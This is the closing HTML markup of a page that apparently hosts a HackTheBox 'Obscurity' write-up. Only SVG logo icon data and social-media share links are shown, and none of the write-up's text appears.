       <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" />
    </symbol>
    <symbol id="icon-gitlab" viewBox="-5 -15 220 200">
      <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" />
      <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" />
      <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" />
      &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt;
      <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" />
      <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" />
      <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" />
    </symbol>
</defs></svg>

<p><br /></p>
<section class="share">

    <h2>Share</h2>

    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=%20http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2019-11-30-Obscurity/%20via%20&#64;0xbro1&amp;hashtags=HackTheBox,Medium,code-review,reversing,python-coding,cracking-shadow-file,custom-exploitation,B2R," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
    </a>

    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2019-11-30-Obscurity/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
    </a>

    <a aria-label="Share on Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://charming-cuchufli-c1e963.netlify.app/writeups/HackTheBox/2019-11-30-Obscurity/&amp;title=Obscurity&amp;summary=&amp;source=
    " onclick="window.open(this.href, 'linkedin-share','width=580,height=296');return false;" title="Share on Linkedin">
        <svg class="icon icon-linkedin"><use xlink:href="#icon-linkedin"></use></svg>
    </a>

</section>

:ET